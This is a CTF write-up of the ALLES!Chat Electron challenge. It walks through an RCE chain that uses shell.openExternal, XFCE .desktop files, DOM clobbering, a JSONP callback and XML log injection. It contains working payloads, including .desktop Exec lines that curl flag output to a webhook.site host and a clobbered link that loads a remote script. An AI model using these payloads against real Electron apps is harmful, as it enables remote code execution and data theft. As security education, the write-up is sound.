# Alles CTF 2021



I started Alles CTF with an intent to understand SOLANA blockchain, because there are solana challenges. So, me and [S3v3ru5_](https://twitter.com/S3v3ru5_) started working on blockchain-secret-store. Then [PewGrand](https://twitter.com/PewGrand) told me that there was an electron challenge, I was excited and started working on it because electron applications are fun 😁. 

## ALLES!Chat
>What could possibly go wrong with an electron app? 🤔
\
Check the README.md in the zip fgor more details :D
\
Challenge Files: alleschat.zip


### BrowserWindow
The electron version used by the app is `13.1.7` which by default enables `contextIsolation`, disables `nodeIntegratione` and `webviewTags` are disabled. So, it is not easy to get RCE without nodeIntegration. 

```js
const createWindow = () => {
  const mainWindow = new BrowserWindow({
    width: 1000,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, "preload.js"),
      sandbox: true,
    },
    icon: path.join(__dirname, "logo.png"),
  });
  ```
 

### Arbitrary urls passed to shell.openExternal()
When I saw, shell.openExternal with arbitrary protocols it became apparent that we can achieve RCE using this. But the app is running on Linux docker, so as far as I know we can't run programs as we can do in Mac like `shell.openExternal('file:///System/Applications/Calculator.app')` but later I realized that its using `XFCE` desktop. 

```js
const downloadDir = process.env.HOME + "/Downloads/";
const logFile = path.join(__dirname, "log.xml");

const openInBrowser = (e, url) => {
  // dont open our html files in the browser
  if (!/file:\/\/.+\.html/.test(url)) {
    e.preventDefault();
    console.log(url)
    shell.openExternal(url);
  }
};

const downloader = (_e, item) => {
  console.log('downloader');
  try {
    if (!fs.existsSync(downloadDir)) {
      fs.mkdirSync(downloadDir);
    }
    item.setSavePath(downloadDir + item.getFilename().replace(/\.\./g, ""));
  } catch (e) {
    console.log(e);
  }
};
```

In xfce desktop we can run commands by opening .desktop files, which means opening `shell.openExternal('file:///pwn.desktop')` gives us the flag.

POC: pwn.desktop
```js
[Desktop Entry]
Exec=sh -c '/app/readflag | curl "https://webhook.site/ea4a966b-3574-4d6a-a8d8-7ca2ff02" -d @-'
Type=Application
```
There is also download handler, so we need to somehow save pwn.desktop file in the victim's system and navigate to that path in electron.

### DOM Clobber to Iframe Injection
We can notice that if isDev is defined all links are converted to embeds, the messages we add to the chat is sanitized with DOMPurifier, DOMPurifier allows id attribute so using id attribute we can clobber `window.isDev`.


```js
  if (window.isDev) {
    // make sure the a tags have a valid href attribute
    let links = Array.from(p.getElementsByTagName("a")).filter(
      (link) => link.href && /^(https?|file|mailto):$/.test(link.protocol)
    );
    links.shift(); // remove "Print This Message" link

    if (links.length > 0) {
      let link = new URL(links.pop());

      if (link.hostname.endsWith(".youtube.com"))
        link = "https://www.youtube.com/embed/" + link.searchParams.get("v");

      let iframe = document.createElement("iframe");
      iframe.sandbox = "allow-scripts allow-same-origin"; // safety first
      iframe.src = link;
      iframe.classList.add("preview", "mt-3");

      p.appendChild(iframe);
    }
  }

```
POC: Below messages inserts iframe with href as url in the chat.
```html
<input id=isDev >
<a href="http://ctf.s1r1us.ninja">hi</a>
```

### Note
At this point, you might think that using iframe injection to download file and creating another iframe which points to that file will solve challenge, but there is an issue. `will-download` is only triggered from mainWindow. So, we can't solve the challenge in this way

### Including Local Files in Iframe
What we can do is, somehow create html file (lets assume file:///test.html) in the victim's system and load it in the iframe. 

But there is an issue DOMPurify doesn't allow file protocol in anchor tags. This is not an issue because we can create anchor tag with relative url and browser adds absolute url based on `location`. If location is `file:///dir/dir/app.html` then `<a href=/test.html>` will be converted to `<a href=file:///test.html>`

Doing so, we can modify DOM of mainWindow because the origins are same. With mainWindow DOM modification, we can trigger `will-download`. 
POC: Triggering `will-download` and download the file without interaction

```js
a = top.document.createElement('a');
    a.download = "test.desktop";
    a.href = "data:,[Desktop Entry]\nExec=curl https://webhook.site/ea4a966b-3574-4d6a-a8d8-7/?a=`/app/readflag`\nType=Application";
    a.click();
```

Now the final piece is to create html file in the victim's system

### Insecure Logging
There is a logging mechanism, which stores given message in an xml file.

```js
const writeLog = (level, msg) => {
  let data;

  try {
    if (fs.existsSync(logFile)) {
      data = fs.readFileSync(logFile, "utf8").split("\n");
      data.splice(
        data.length - 1,
        0,
        `\t<${level}>[${new Date().toISOString()}] ${msg}</${level}>`
      );
    } else {
      data = [
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
        "<logs>",
        `\t<${level}>[${new Date().toISOString()}] ${msg}</${level}>`,
        "</logs>",
      ];
    }
    fs.writeFileSync(logFile, data.join("\n"), {
      flag: "w",
    });
  } catch (e) {
    console.log(e);
  }
};

```

We can log the xml in this file if the postMessage is coming from `file:///` origin or `http://127.0.0.1:1024`(apiUrl)
```js

window.addEventListener("message", (e) => {
  if (
    (e.origin !== "file://" && e.origin !== apiUrl) ||
    typeof e.data !== "object"
  )
    return;
```

We need either XSS on api to log xml in log.xml file.

### XSS on api (interesting part)

On api we can notice an jsonp callback, interesting enough characters `[].` along with alphanums are allowed in the callback, so we can call arbitrary methods using this jsonp callback. This doesn't give allows us to postMessage to the top window. We must need an XSS here.

At this point, I am trying various stuff and [terjanq](https://twitter.com/terjnaq) came online and we both started working on it.

There is onerror event handler, which logs errors in xml file. We tried various things to trigger error via limited html injection. It turned out to be impossible to generate proper error with html in it.
```js
window.onerror = (err) => {
  writeLog("error", err);
};
```

After some time, terjanq pointed out to me an interesting sink.

```js
        if (params.get("auto")) setTimeout(print, 2000);
```
He said we can delete `print` and redefine via DOM Clobbering so that arbitrary js gets executed.

POC: jsonp callback to delete `print` function
```js
?cb=[delete[this][0].print].push
```
POC: DOM Clobbering to redefine print which executes js
```html
<a id=print href="cid:a=document.createElement('script');a.src='https://ctf.s1r1us.ninja/ctf/alles.js';document.body.append(a)">asd</a>
```

### Super Chain
1. Using XSS on api we send and postMessage which logs XML data `X` in the local file log.xml(file:///app/src/log.xm),
2. `X` contains javascript to download `pwn.desktop` and a navigaton to `pwn.desktop` after 1 second.
3. We include the `file:///app/src/log.xml` in an iframe with relative url which executes XML data `X`

POC: [1]  
```
var JS = (function(){
    a = top.document.createElement('a');
    a.download = "pwn.desktop";
    a.href = "data:,[Desktop Entry]\nExec=curl https://webhook.site/ea4a966b-3574-4d6a-a8d8-7ca52ff02/?a=`/app/readflag`\nType=Application";
    a.click();
new Image().src='https://webhook.site/ea4a966b-3574-4d6a-a8d8-7caf28502?done=1';
    setTimeout(()=>{
        b = top.document.createElement('a');
        b.href = "file:///home/node/Downloads/pwn.desktop";
	b.click();
new Image().src='https://webhook.site/ea4a966b-3574-4d6a-a8d8-7caf2852ff02?done=2';
    },1000); 
});

var XML = `<x:script xmlns:x="http://www.w3.org/1999/xhtml">(${JS})()</x:script>`

top.postMessage({type:'logging', level: "test", msg: XML}, '*');
```
